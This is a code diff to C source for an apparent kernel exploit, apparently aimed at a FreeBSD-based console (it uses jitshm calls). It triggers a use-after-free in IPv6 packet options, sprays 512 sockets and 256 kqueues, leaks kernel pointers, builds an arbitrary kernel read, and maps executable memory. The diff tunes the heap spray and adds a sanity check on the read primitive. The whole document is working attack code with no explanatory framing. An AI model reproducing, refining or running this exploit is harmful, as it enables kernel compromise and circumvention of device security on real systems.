@@ -209,12 +209,12 @@ void leak_kevent_pktopts(struct opaque* o, int overlap_sock, unsigned long long*
     for(int i = 0; i < 256; i++)
         kevent(o->kq[i], &kv, 1, 0, 0, 0);
     printf("kevent_addr = 0x%llx\n", ptrs[0]);
-    for(int i = 0; i < 256; i++)
+    for(int i = 0; i < 512; i++)
         free_pktopts(o->spray_sock[i]);
     ptrs[1] = leak_kmalloc(o->master_sock, overlap_sock, buf, 0x100);
     if(set_rthdr(o->master_sock, NULL, 0))
         *(volatile int*)0;
-    for(int i = 0; i < 256; i++)
+    for(int i = 0; i < 512; i++)
         set_tclass(o->spray_sock[i], 0);
     printf("pktopts_addr = 0x%llx\n", ptrs[1]);
 }
@@ -233,12 +233,14 @@ void write_to_victim(struct opaque* o, unsigned long long addr)
 int find_victim_sock(struct opaque* o, unsigned long long pktopts_addr)
 {
     char buf[sizeof(struct in6_pktinfo)];
+    for(int i = 0; i < 512; i++)
+        set_pktinfo(o->spray_sock[i], 0);
     write_to_victim(o, pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
-    for(int i = 0; i < 256; i++)
+    for(int i = 0; i < 512; i++)
     {
         *(unsigned long long*)buf = 0;
         get_pktinfo(o->spray_sock[i], buf);
-        if(*(unsigned long long*)buf)
+        if(*(unsigned long long*)buf == pktopts_addr + PKTOPTS_PKTINFO_OFFSET)
             return i;
     }
     return -1;
@@ -398,37 +400,28 @@ int main()
 {
     if(!setuid(0))
         return 179;
-    char* not_close = ((char*)mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)) + 4096;
+    for(int i = 0; i < 16; i++)
+        new_socket();
     int tmp;
-#define TAINTFD(x) do { tmp = x; not_close[tmp] = 1; } while(0)
-#define NEWSOCK(x) do { x = tmp = new_socket(); not_close[tmp] = 1; } while(0)
     unsigned long long idt_base;
     unsigned short idt_size;
     sidt(&idt_base, &idt_size);
     printf("sidt = 0x%hx 0x%llx\n", idt_size, idt_base);
-    int kevent_sock;
-    NEWSOCK(kevent_sock);
-    int master_sock;
-    NEWSOCK(master_sock);
-    int spray_sock[256], kq[256];
+    int kevent_sock = new_socket();
+    int master_sock = new_socket();
+    int spray_sock[512], kq[256];
     int q1 = 0, q2 = 0;
+    for(int i = 0; i < 512; i++)
+        q1 += (spray_sock[i] = new_socket());
     for(int i = 0; i < 256; i++)
-    {
-        NEWSOCK(spray_sock[i]);
-        q1 += spray_sock[i];
-    }
-    for(int i = 0; i < 256; i++)
-    {
         q2 += (kq[i] = kqueue());
-        //TAINTFD(kq[i]); // gets closed down the road, so no need
-    }
     printf("sockets=%d kqueues=%d\n", q1, q2);
     struct opaque o = {.master_sock = master_sock, .kevent_sock = kevent_sock, .spray_sock = spray_sock, .kq = kq};
     trigger_uaf(&o);
     printf("uaf ok!\n");
     set_tclass(master_sock, TCLASS_TAINT);
     int overlap_idx = -1;
-    for(int i = 0; i < 256; i++)
+    for(int i = 0; i < 512; i++)
         if(get_tclass(spray_sock[i]) == TCLASS_TAINT)
             overlap_idx = i;
     printf("overlap_idx = %d\n", overlap_idx);
@@ -436,14 +429,14 @@ int main()
         return 1;
     int overlap_sock = spray_sock[overlap_idx];
     int cleanup1 = overlap_sock;
-    NEWSOCK(spray_sock[overlap_idx]);
+    spray_sock[overlap_idx] = new_socket();
     overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, 0);
     printf("overlap_idx = %d\n", overlap_idx);
     if(overlap_idx < 0)
         return 1;
     overlap_sock = spray_sock[overlap_idx];
     int cleanup2 = overlap_sock;
-    NEWSOCK(spray_sock[overlap_idx]);
+    spray_sock[overlap_idx] = new_socket();
     unsigned long long ptrs[2];
     int victim;
     leak_kevent_pktopts(&o, overlap_sock, ptrs);
@@ -453,13 +446,19 @@ int main()
     if(overlap_idx < 0)
         return 1;
     overlap_sock = spray_sock[overlap_idx];
-    NEWSOCK(spray_sock[overlap_idx]);
+    spray_sock[overlap_idx] = new_socket();
     victim = find_victim_sock(&o, ptrs[1]);
     printf("victim_idx = %d\n", victim);
     if(victim < 0)
         return 1;
     victim = spray_sock[victim];
     unsigned long long knote, kn_fop, f_detach, kernel_base = 1;
+    unsigned long long magic = 179179179;
+    if(kread64(&o, victim, &magic) != magic)
+    {
+        printf("error: buggy arb r/w!\n");
+        return 1;
+    }
     for(int i = 0; i < 10 && kernel_base & 4095ull; i++)
     {
         knote = kread64(&o, victim, ptrs[0] + kevent_sock * 8);
@@ -488,9 +487,7 @@ int main()
     int jit1, jit2;
     errno = 0;
     jit1 = jitshm_create(0, 16384, PROT_READ|PROT_WRITE|PROT_EXEC);
-    TAINTFD(jit1);
     jit2 = jitshm_alias(jit1, PROT_READ|PROT_WRITE);
-    TAINTFD(jit2);
     printf("jit: %d %d\n", jit1, jit2);
     char* page_rx = mmap(NULL, 16384, PROT_READ|PROT_EXEC, MAP_SHARED, jit1, 0);
     thread_0x130_0x68 &= ~__builtin_gadget_addr("dq 0x2000000000000000");
@@ -534,10 +531,9 @@ int main()
         };
         sigaction(SIGTERM, &ignore);
         sigaction(SIGKILL, &ignore);
-        for(int i = 0; i < 4096; i++)
-            if(!not_close[i])
-                if(!close(i))
-                    printf("closed fd %d\n", i);
+        for(int i = 0; i < 16; i++)
+            if(!close(i))
+                printf("closed fd %d\n", i);
         for(;;)
             nanosleep("\xe8\x03\0\0\0\0\0\0\0\0\0\0\0\0\0\0", NULL);
     }
